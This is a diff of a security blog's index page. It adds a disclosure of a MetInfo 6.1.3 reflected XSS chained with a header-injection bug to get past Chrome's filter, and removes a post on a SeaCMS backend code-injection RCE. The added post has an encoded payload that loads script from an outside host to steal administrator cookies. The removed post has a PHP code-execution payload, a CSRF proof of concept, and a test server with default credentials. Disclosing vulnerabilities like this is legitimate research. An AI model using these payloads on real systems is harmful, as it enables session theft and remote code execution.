@@ -317,6 +317,209 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/metinfo-reflected-xss-bypass-chrome/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/metinfo-reflected-xss-bypass-chrome/index.html" itemprop="url">
+                  metinfo reflected xss bypass chrome
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-12-04 17:47:07" itemprop="dateCreated datePublished" datetime="2018-12-04T17:47:07+08:00">2018-12-04</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Metinfo-latest-version-6-1-3-has-a-reflected-xss-vul-with-another-vul-which-can-cause-arbitrary-response-headers-set-we-can-bypass-chrome-xss-filter-CVE-2018-19835-and-CVE-2018-19836"><a href="#Metinfo-latest-version-6-1-3-has-a-reflected-xss-vul-with-another-vul-which-can-cause-arbitrary-response-headers-set-we-can-bypass-chrome-xss-filter-CVE-2018-19835-and-CVE-2018-19836" class="headerlink" title="Metinfo latest version(6.1.3) has a reflected xss vul, with another vul which can cause arbitrary response headers  set we can bypass chrome xss filter. [CVE-2018-19835 and CVE-2018-19836]"></a>Metinfo latest version(6.1.3) has a reflected xss vul, with another vul which can cause arbitrary response headers  set we can bypass chrome xss filter. [CVE-2018-19835 and CVE-2018-19836]</h1><blockquote>
+<p>Metinfo is an powerful cms used widely in china.<code>https://www.metinfo.cn/</code>  recently I find two vuls and combine them we can bypass chrome’s xss filter to affect administrators.</p>
+</blockquote>
+<h2 id="vul1"><a href="#vul1" class="headerlink" title="vul1"></a>vul1</h2><p>firstly, there exists an reflected XSS in metinfo latest version(6.1.3),</p>
+<p>url:<code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;lang_columnerr4=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;metcms=1</code></p>
+<p><img src="https://raw.githubusercontent.com/imagemlt/metinfo/master/reflected_xss_bypass_chrome/alert.png" alt=""><br>since no cookies protected with http-only we can directy use them.</p>
+<p>why does this vul exists?</p>
+<p>we check <code>/admin/column/move.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../login/login_check.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'global.func.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($foldyanzheng)&#123;</span><br><span class="line">	$metcms=<span class="string">''</span>;</span><br><span class="line">	$folder_m=$db-&gt;get_one(<span class="string">"SELECT * FROM $met_column WHERE foldername='$foldername' and lang='$lang'"</span>);</span><br><span class="line">	<span class="keyword">if</span>($folder_m)$metcms=$lang_columnerr4;</span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-z0-9_-]+$/i'</span>,metdetrim($foldername)))$metcms=$lang_columnerr1;</span><br><span class="line">	<span class="keyword">echo</span> $metcms;</span><br><span class="line">	<span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>we only need <code>$folderyanzheng</code>&gt;0  and<code>$folder_m</code> is not null, we can get <code>$lang_columnerr4</code> directly shown in the dom .and just in <code>/include/common.inc.php</code> there exists an register of variables that can be controlled by us：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">		$_M[<span class="string">'form'</span>][$_key] = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>so we can controll the variable <code>$lang_columnerr4</code>.</p>
+<p>but we know vuls like this can only affect browsers that have no xss protections. how do we affect browsers like chrome that have powerfull xss filters? see next vul. </p>
+<h2 id="vul-2"><a href="#vul-2" class="headerlink" title="vul 2"></a>vul 2</h2><p>there exists an vul that enables you to set any headers in</p>
+<p><code>/include/interface/applogin.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../common.inc.php'</span>;</span><br><span class="line">$query = <span class="string">"UPDATE &#123;$met_config&#125; set value='&#123;$apppass&#125;' where name = 'met_apppass'"</span>;</span><br><span class="line">$db-&gt;get_one($query);</span><br><span class="line">header(<span class="string">"&#123;$serverurl&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>in <code>common.inc.php</code> there exists an operation to register all variables which can be controlled by users;<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">		$_M[<span class="string">'form'</span>][$_key] = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>so here we can communicate this vul with vul1 to bypass chrome’s xss filter,because chrome’s xss filter donnot check  data from user’s cookie. </p>
+<h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p>Let administrator visit this address</p>
+<p><code>http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253cimg%20src%3dasd%20onerror%3deval(String.fromCharCode(118,97,114,32,120,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,120,46,115,114,99,61,34,47,47,120,115,115,112,116,46,99,111,109,47,80,87,87,50,65,105,34,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,120,41,59))%3E;path=/</code></p>
+<p>we can see an responce header is set。<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/responce_headers.png?raw=true" alt="responce_headers.png"></p>
+<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>let the administrator visit </p>
+<p><code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1</code></p>
+<p>here we can see the data in user’s cookie is shown in the dom<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/dom_loaded.png?raw=true" alt="dom_loaded.png"></p>
+<p>in my xss platform(platform to recieve xss data),we can see cookie of the manager is captured.<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/xss_back.png?raw=true" alt="xss_back.png"></p>
+<h3 id="just-want-an-alert"><a href="#just-want-an-alert" class="headerlink" title="just want an alert?"></a>just want an alert?</h3><p>first visit</p>
+<p><code>http://127.0.0.1:8888/include/interface/applogin.php?serverurl=Set-Cookie%3alang_columnerr4%3d123%253csvg/onload%3dalert(1)%3E;path=/</code></p>
+<p>secondly<br><code>http://127.0.0.1:8888/admin/column/move.php?foldyanzheng=1&amp;foldername=member&amp;metcms=1</code><br>now you can see an alert<br><img src="https://github.com/imagemlt/metinfo/blob/master/reflected_xss_bypass_chrome/alert.png?raw=true" alt="alert.png"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/用树莓派zero-w做电脑的无线网卡/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2178,191 +2381,6 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/seacms-backend-getshell/index.html" itemprop="url">
-                  seacms backend getshell
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-07-18 11:30:58" itemprop="dateCreated datePublished" datetime="2018-07-18T11:30:58+08:00">2018-07-18</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="backend-RCE-in-the-latest-version-of-SeaCMS-v6-61"><a href="#backend-RCE-in-the-latest-version-of-SeaCMS-v6-61" class="headerlink" title="backend RCE in the latest version of SeaCMS(v6.61)"></a>backend RCE in the latest version of SeaCMS(v6.61)</h1><p>In SeaCMS’s admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture’s url,we can execute random code to getshell.though there are some way’s in the /include/main.class to limit the usage of the code,we can find ways to bypass it.<br>So How does this vul be triggerd? here are some Steps:  </p>
-<ul>
-<li>Firstly login to the admin panel, in this case the admin directory is adjusted to <code>/backend</code>.<br><img src="http://p7lc13qga.bkt.clouddn.com/backend.PNG" alt=""></li>
-<li>Secondly add a movie and set it’s pictrue address as <code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code><br><img src="http://p7lc13qga.bkt.clouddn.com/add.png" alt=""></li>
-<li>After adding it visit <code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();</code>you can find <code>phpinfo()</code> is executed.<br>here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html.<br><img src="http://p7lc13qga.bkt.clouddn.com/vul.PNG" alt=""></li>
-<li>Or you can just visit <code>/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code>or any other places that display the video’s pic you have just added.</li>
-</ul>
-<p>Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.<br>csrf poc is here:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- adjust action to your url --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/seacms/backend/admin_video.php?action=save&amp;acttype=add"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;name"</span> <span class="attr">value</span>=<span class="string">"getshell"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;enname"</span> <span class="attr">value</span>=<span class="string">"ceshi"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;color"</span> <span class="attr">value</span>=<span class="string">"&amp;#35;FF0000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;type"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;state"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;pic"</span> <span class="attr">value</span>=<span class="string">"&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;spic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;gpic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;actor"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;director"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;note"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tags"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select3"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publishyear"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select2"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;lang"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select1"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;publisharea"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"select4"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;ver"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;hit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;monthhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;weekhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;dayhit"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;len"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;total"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;nickname"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;company"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;tvs"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;douban"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;mtime"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;imdb"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;score"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;scorenum"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;longtxt"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;money"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;psd"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;playurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downfrom&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"m&amp;#95;downurl&amp;#91;1&amp;#93;"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;content"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"�&amp;#161;&amp;#174;�&amp;#174;&amp;#154;�&amp;#143;&amp;#144;浜&amp;#164;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>you can test this vul at <code>http://111.230.11.248:10089/backend/</code>,and the username and password is admin|admin.</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
